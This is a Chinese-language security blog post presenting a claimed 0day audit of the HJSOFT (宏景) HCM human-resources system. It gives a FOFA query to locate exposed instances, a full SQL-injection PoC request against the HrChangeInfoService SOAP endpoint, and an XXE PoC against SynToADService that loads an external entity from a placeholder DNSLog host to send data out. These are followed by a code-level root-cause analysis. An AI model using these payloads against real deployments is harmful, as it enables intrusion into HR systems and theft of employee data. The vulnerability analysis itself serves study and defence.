#  [跟着静师傅学代码审计]宏景人力资源信息管理系统代码0day审计  
原创 静师傅
                    静师傅  安静安全   2026-02-10 01:06  
  
点击上方「蓝字」，关注我们  
  
01  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM64D97Qw4SibibZyBAZDd2kAT3m7RLzTwwPma1cW4xfeHrYcFia07VwPOWmLxp9e9bbsfzabIMgOBOQu3B4MUEZIicm60ohlDEdFa74O7KibiaITXWw/640?wx_fmt=svg&from=appmsg "")  
  
# SQL注入漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6AaAb1ia2lcH3wrzcubiasWW9VoEb7OdOOibZe6N4YmXxFPkficEIdgaAibJALQkoOw88A0mficqMTibRc9wW8SnVHcVWIo6atvb4bwb1jkb3aqpOPw/640?wx_fmt=svg&from=appmsg "")  
  
  
fofa:  
  
app="HJSOFT-HCM"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWKYcgHsQglNreXVx3jC3mMtvUYMDxlsicZgbekI3seYTru2y1BC2fzjnW5FbianHnmnc832tkms5AABM5rryaQLhypwWdnEpwKs/640?wx_fmt=png&from=appmsg "")  
  
SQL注入POC数据包:  
```
POST /services/HrChangeInfoService HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Content-Length: 448

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
         xmlns:ser="http://service.core.hrms.com">
 <soapenv:Header/>
 <soapenv:Body>
  <ser:returnSynchroString>
   <strString>test</strString>
   <username>admin';*</username>
   <password>test</password>
  </ser:returnSynchroString>
 </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWuNDkz2OShicxMBJMNYrXw1ic0dSj6k5W0nxFOk4YsPBKicFLyTDrwS3xDkDrYDyQZjjEyYQgxX0MHicRrmibd3oXhxhjGIYedKiaQE/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWy60Hnp27WMbJibvar1MS1zX8iaicAWVSCzxvMP6ya9LrRIG3Wm4qxGoywtlib4iahwiaianUYLgGWA0DLHdAxey95KTESLlITZRZS94/640?wx_fmt=png&from=appmsg "")  
  
查看web.xml，我给出的POC接口用的是/services，其实也可以是  
/servlet/XFireServlet/接口，因为调用的都是同一个calss类。  
  
分析  
:  
  
org.codehaus.xfire.transport.http.XFireConfigurableServlet  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HUsutibiaZEzic3m87vBKqYVibP80gfaQbkY3cKt6ibiaAsTE9P8xq3iaUcUotZUWVyIeN5fUyNSjUib4W2xXric49R8ZdZjNkVdlRprfac/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HXwnsxia8MCaGDl6kfWOZJPeI84xL3qVMREyAUUJdibRfdicPnQMMIsgZArOic6cLq0mqyJnBvGNaK77uWkjGUINnEdbCXP0DEuWiag/640?wx_fmt=png&from=appmsg "")  
  
该  
XFireConfigurableServlet.class主要是通过配置文件  
META-INF/xfire/services.xml进行后续的操作，跟进servies.xml查看。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HXMVgEs9CJpJTbhA5XHwKgB9rmar0wLCHiaS2QzLGjBiclFPdichDftHK6tHRgvT7DW3DicRhxt2nAECicIlJgsMrwZJfia7Hq2egsaA/640?wx_fmt=png&from=appmsg "")  
  
逻辑是通过不同的命名name进入相应的serviceClass类进行处理，SQL注入漏洞是在  
HrChangeInfoService，跟进  
com.hjsj.hrms.service.core.HrChangeInfoService分析代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HVKh5GkK7wNkdKrpmWGqyclNNU6uGMK0VohHwnUPn6nibvcMfH5b7bYVoBVtMTzTIqISsFOAT3LN8Z17wcxtVIRtiaA2aqaOHC0c/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HWbAZVF4MnBYumevN2Q2YR2wOzpicydWPJM4c1W0KjEictQr0NjSBwCjr60ffU65xnVEgeaZ2rOzDk06JhjYov3sdXicSdzwKicttw/640?wx_fmt=png&from=appmsg "")  
  
在HrChangeInfoService类下会有不同的方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWCC5zv6YQ3yt0MzXj7yrqRY8fu7n5OFAK2ISibD1fXHZ55Dicg86QMtxN42XnhoorEbNn1zcOnS9ErnREegUKKicVjH5dYgrjZ1I/640?wx_fmt=png&from=appmsg "")  
  
位于代码163行的  
returnSynchroString方法存在SQL注入漏洞，接收参数为  
strString、username、password，接着跟进  
this.cheakCode查看。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWrWoxc1kIfEQibXleSNPnh7VXYpcAm0nOso8gZekvNrkuOsZPeBp2ZQLPWv2iceoQf6NXlKJicunBfibPKyJXFj5Bq5eMgZ3lHHFU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HVUjHvWlsbOpaBgwh5s8cuvE0QwhMy4BDHPhvL2vH9j4TjG10ohMiazIrshiaGLHrcibGSepTXvLGibvW0YTMXk4cvYOliae2ibsbcg0/640?wx_fmt=png&from=appmsg "")  
  
可以看到，在cheakCode方法下可控参数直接拼接了select语句导致形成SQL注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HUZ4V243Cur4ic4xyHyjHibWGTFMGsQktDkp8OSZ32c4ViaK8oZVFmGK7adU9lEoLhLK1OSlUian58dFGa0iaq9VYHn1NxMcibVRIDro/640?wx_fmt=png&from=appmsg "")  
  
其他方法如  
getWhereChangeUsers同样是通过  
this.cheakCode导致SQL注入漏洞。  
  
02  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4Qmv2qm5pLJTof6Tic4tTz91Aqd2P7qzckVZHPoCSqTf7HjU9jfDcB4B6licCrv8COYX15iaJMoSVNXESOZ6JmfZ6FZ5A0TF2ycxutwgLOA4z9Q/640?wx_fmt=svg&from=appmsg "")  
  
# XXE漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5icjEkp4Cj7z51fcaUuOpjR0gmVxB5uzpcOmjzRJlQTiabBrtGia948UH2ibmpVd1kWL01dwJkaemibE8Ixxh0TDXOtoib1pG4Renj30W6nOMoibcmA/640?wx_fmt=svg&from=appmsg "")  
  
  
POC数据包如下:  
```
POST /services/SynToADService HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Content-Type: text/xml; charset=UTF-8
SOAPAction: ""
Content-Length: 850

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
         xmlns:ser="http://service.core.hrms.com">
 <soapenv:Header/>
 <soapenv:Body>
  <ser:sendSyncMsg>
   <xmlMessage>
    <![CDATA[<!DOCTYPE hr [
     <!ENTITY % remote SYSTEM "你的DNSLog链接">
     %remote;
     %send;
    ]>
    <hr>
     <recs>
      <rec>org,emp</rec>
     </recs>
     <jdbc>
      <datatype>oracle</datatype>
      <database>test</database>
      <ip_addr>127.0.0.1</ip_addr>
      <username>test</username>
      <port>1521</port>
      <pass>test</pass>
     </jdbc>
    </hr>]]>
   </xmlMessage>
  </ser:sendSyncMsg>
 </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWNyLRFia1vmAndfvpfErdLHbemXYRhRL8JHuNwXJFZpVr6NgTEWTJTS8SYSstKhNsQE9Fv1xZsgvOQBiaZwgibFTibFTLTLQXpwJ8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HUlsS6RJMBNOQ1Sj1IgB2bPxMicbetHWL2OC8uQHub8PqeB93RONibiaynnS1qJg9gGr8O7wmYJI6etGtJ4xhiamkGGz1xGichW1TvI/640?wx_fmt=png&from=appmsg "")  
  
成功复现。  
  
漏洞分析:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HX87Nv7H6a1DIvjjaSZwxzAI1BvNxsoHwyKAgpZicJqqkHZ5sj1QPiaKSsYaEl8ibEfLCBp1kfzqsUfPafToF35kVoO9WQvh7xNibY/640?wx_fmt=png&from=appmsg "")  
  
在services.xml文件中，位于命名空间SynToADService下的Class位置com.hjsj.hrms.service.ladp.SynToADService进行漏洞分析。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HU5EJgmFwg0n55PoBiaBRXljH4fysOEHDYyFFPe6JeZauA3BhVeRsHibcYeqtbcnRP6nIticB9UFS5e7xWFLOUdqEE89OOn0TiaeF0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWlBNicUokFj2dzeZ7UNqs78qQrncVIWiaSxTiaia35qfrw3EzkmAbia1ASWCWuVibzXZ1qO1RuX6zM3XOmOWdNc1rd07oFHrN35TDzE/640?wx_fmt=png&from=appmsg "")  
  
在sendSyncMsg方法中，接收参数xmlMessage，触发XXE外部实体注入的问题是出现在synUtils.parseXml中，跟进synUtils.parseXml查看。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HX9ibu4kLMUibib1ibyg8IoU10fZuib7O77vtD1bDym9EjgticxDiceGZBzNdqGIqbEwKjzdpWddiarzS3iaRplAaoKnacsRrN3IkdHxias8/640?wx_fmt=png&from=appmsg "")  
  
跟进后来到该parseXML方法中，可以看到形成XML外部实体注入的原因是因为:  
```
SAXBuilder saxbuilder = new SAXBuilder();  // 漏洞点1：未配置安全属性
StringReader reader = new StringReader(xmlMessage);
Document doc = saxbuilder.build(reader);  // 漏洞点2：直接解析外部可控的XML
```  
  
并且由于xmlMessage参数是外部传入的可控字符串，从而可以解析外部XML形成XXE外部实体注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM62tunDvtVKK9u2xZK8pHqUPNNGtLyXxxUuVdCVqxquHMiaU1VH6tKaRAAQDfjxntABAZlX60dmKzrh7bM775l4kibg4v7BFNuicKEUY8Yic5ZW5w/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HXPUSpvZ8gHePGCDcpn5DKJOvuNqwNRF69ia1f72DONGPTC28IDo1Dtbx6QmibHL6rX9icCBzcekwiambCia2oVeEzE84TeSswWEntQ/640?wx_fmt=png&from=appmsg "")  
  
# 往期文章推荐  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7eqODibPN4yoNFFPhoQSKAkkpO3ubw9UemUjTfoiaicLocE2SltL6e2ZxeeiacqaP2WaneJ1L8nBZPasSsOUrIad8Wsic0peJCsVuOAgw65fMgHkw/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计]月子会所ERP管理云平台0day审计](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247495302&idx=1&sn=b5423a0f5033abce81565ed90c4d1c97&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7zaMe7pKxBpU8AlvkR4kx9qRbjiapNUFwmVRKAia8dq8t3BSQdIwRY1FQsXtoAFdicHDLhoQqypuCwzJgQOiaH6H4synBmmmoc9hJ1hT4Aia0kWQw/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计]itc中心管理服务器审计](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494835&idx=1&sn=11dc9ba633123039d178ea95daec498c&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6XHV0V5ZvXWmylHqgs28quwbIQ5wg9kLRx4zLRTd3vkljtKU3LScPiciauczB14nSvgvE1hZVDs7w5wJcBvl1BSXFibt8iaQrnRlQPsQrQ95vicxg/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计-全网首发]用友U9 V6.6企业版多组织企业互联网应用平台命令执行+SQL+反序列化](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494706&idx=1&sn=3a390be197f5c1b0d44e81f6604a764e&scene=21#wechat_redirect)  
  
  
###### 公众号：安静安全  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM61bdAEtrLcRLxaRgUzYSUUUv5RKAViaasaM5KUuNmh7f3q9OzSl1pvgp7USdYicbotSJbzfBdNHzROcS4aVMmZZaZdxNxj5IqKIFOl2LoxAD8A/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5G7RZHJTvGRGic7Y8icq5Nax3AY2CnavjKsOJKNjLviaT2gicYJUAtUZQzpERPhgnNeBN5q8Way4EBAoiakz0TD2MRD0XONUwONric3NiazJvOYjpSw/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7bZzHwgCDhfeWIDXtibo5DFEumRpEO8D1tzezBI6cibFeziagHicAOQhUI4K8V11gURvoOHfVPGuYYOVmKSCWrRRUIPiaH6Cwl2kU6x8InA1Udf5Q/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6NQr89cFd3riahko0BExiaLe1cJJkymENYlMuwD9Knb5OMCz8Lnu3PxTSFYVdjqwvyL0kVY4COjjH0VU1IzphxXVfJGeLp8QvAooQLsviaenicxw/640?wx_fmt=svg&from=appmsg "")  
  
  
点个「在看」，你最好看  
  
  
